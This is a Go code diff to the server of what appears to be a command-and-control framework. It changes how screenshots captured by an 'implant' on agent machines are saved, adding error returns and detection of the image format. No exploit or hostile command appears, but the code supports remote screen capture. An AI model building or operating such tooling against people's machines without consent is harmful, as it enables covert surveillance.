@@ -21,14 +21,43 @@ import (
 
 // 鈹€鈹€ Screenshots, path/IP/geo helpers, ls normalize 鈹€鈹€鈹€
 
-func (s *Server) saveScreenshot(dataDir, agentID string, taskID uint, b64Data string) {
+func (s *Server) saveScreenshot(dataDir, agentID string, taskID uint, b64Data string) error {
 	if s.IsScreenMonitoring(agentID) {
-		return // do not retain files during live screen monitoring
+		return nil // do not retain files during live screen monitoring
 	}
-	s.writeScreenshotFile(dataDir, agentID, taskID, b64Data)
+	return s.writeScreenshotFile(dataDir, agentID, taskID, b64Data)
 }
 
-func (s *Server) writeScreenshotFile(dataDir, agentID string, taskID uint, b64Data string) {
+// screenshotFileExtension names the file after the bytes it contains. The
+// implant captures JPEG, so storing every capture as ".png" made downloads and
+// MIME headers lie about the format.
+func screenshotFileExtension(data []byte) string {
+	switch http.DetectContentType(data) {
+	case "image/jpeg":
+		return ".jpg"
+	case "image/png":
+		return ".png"
+	case "image/gif":
+		return ".gif"
+	case "image/webp":
+		return ".webp"
+	default:
+		// Legacy/synthetic payloads keep the historical name so existing
+		// directories and tests do not acquire a second spelling.
+		return ".png"
+	}
+}
+
+// screenshotMime names the format of stored bytes, falling back to image/png
+// for legacy fixtures that are not a complete image.
+func screenshotMime(data []byte) string {
+	if mime := http.DetectContentType(data); strings.HasPrefix(mime, "image/") {
+		return mime
+	}
+	return "image/png"
+}
+
+func (s *Server) writeScreenshotFile(dataDir, agentID string, taskID uint, b64Data string) error {
 	if dataDir == "" {
 		dataDir = "data"
 	}
@@ -36,25 +65,27 @@ func (s *Server) writeScreenshotFile(dataDir, agentID string, taskID uint, b64Da
 	dir := safeJoin(base, agentID)
 	if dir == "" {
 		slog.Error("Invalid agent ID for screenshot path", "agent_id", agentID)
-		return
+		return fmt.Errorf("invalid agent id for screenshot path")
 	}
 	if err := os.MkdirAll(dir, 0700); err != nil {
 		slog.Error("Failed to create screenshots dir", "agent_id", agentID, "error", err)
-		return
+		return err
 	}
 	data, err := base64.StdEncoding.DecodeString(b64Data)
 	if err != nil {
-		return
+		return fmt.Errorf("invalid screenshot base64: %w", err)
 	}
-	filename := fmt.Sprintf("screenshot_%d_%d.png", taskID, time.Now().Unix())
+	filename := fmt.Sprintf("screenshot_%d_%d%s", taskID, time.Now().Unix(), screenshotFileExtension(data))
 	filePath := safeJoin(dir, filename)
 	if filePath == "" {
 		slog.Error("Invalid screenshot filename", "filename", filename)
-		return
+		return fmt.Errorf("invalid screenshot filename")
 	}
 	if err := os.WriteFile(filePath, data, 0600); err != nil {
 		slog.Error("Failed to save screenshot", "file", filename, "error", err)
+		return err
 	}
+	return nil
 }
 
 func (s *Server) handleServeScreenshot(c *gin.Context) {
